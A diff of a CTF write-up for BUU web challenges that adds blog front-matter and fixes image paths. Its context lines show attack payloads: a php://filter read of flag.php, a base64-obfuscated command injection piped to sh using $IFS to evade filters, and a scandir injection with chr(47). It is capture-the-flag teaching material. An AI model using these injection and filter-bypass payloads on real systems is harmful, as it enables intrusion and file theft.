@@ -1,3 +1,8 @@
+---
+title: BUU_WEB刷题_0x01-0x0F
+date: 2021-04-17 
+tags: WEB
+---
 [TOC]
 
 ## 0x1.[HCTF 2018]WarmUp
@@ -258,7 +263,7 @@ payload=?file=php://filter/read=convert.base64-encode/resource=flag.php
 
 但是经过测试，之后分号可以多个命令一起执行（在这道题）
 
-![image-20210415165001140](未命名.assets/image-20210415165001140.png)
+![image-20210415165001140](BUU-WEB-0x1-0xF/image-20210415165001140.png)
 
 找到flag.
 
@@ -337,7 +342,7 @@ echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
 ?%20num=1;var_dump(scandir(chr(47)))
 ```
 
-![image-20210415181858484](未命名.assets/image-20210415181858484.png)
+![image-20210415181858484](BUU-WEB-0x1-0xF/image-20210415181858484.png)
 
 
 
